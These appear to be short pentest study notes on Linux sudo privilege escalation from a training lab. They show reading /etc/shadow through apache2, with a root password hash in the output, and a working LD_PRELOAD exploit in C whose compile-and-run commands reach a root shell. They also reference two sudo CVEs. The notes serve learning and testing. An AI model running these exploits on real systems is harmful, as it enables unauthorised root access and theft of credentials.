# sudo shell escaping
Check which programs can be run by user as root with `sudo -l`. Use [gtfobins](https://gtfobins.github.io/) and search for a program.

---
# intended functionality
If you find a program with `sudo -l` that is not on gtfobins, search google for privilege escalation with the program.
Example:
~~~
# we found apache2
# google said we can use -f to view files
TCM@debian:~$ sudo apache2 -f /etc/shadow           
Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration
~~~

---
# LD_PRELOAD
~~~
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD
~~~

~~~
TCM@debian:~$ vi shell.c                                                                                            
~~~

~~~c
#include <sys/types.h>
#include <stdlib.h>

void _init() {
  unsetenv("LD_PRELOAD");  
  setgid(0);  // set group id to root
  setuid(0);  // set user ud to root
  system("/bin/bash");  // use bash to do this
}
~~~

~~~
TCM@debian:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
TCM@debian:~$ sudo LD_PRELOAD=/home/user/shell.so apache2
root@debian:/home/user# 
~~~

---
# [CVE-2019-14287](https://www.exploit-db.com/exploits/47502)
Use when `sudo -l` returns `$USER ALL=(ALL,!root) /bin/bash`.

---
# [CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)
Works on sudo version 1.8.21p2.
Pwfeedback has to be enabled in sudoers:
`Defaults env_reset,pwfeedback`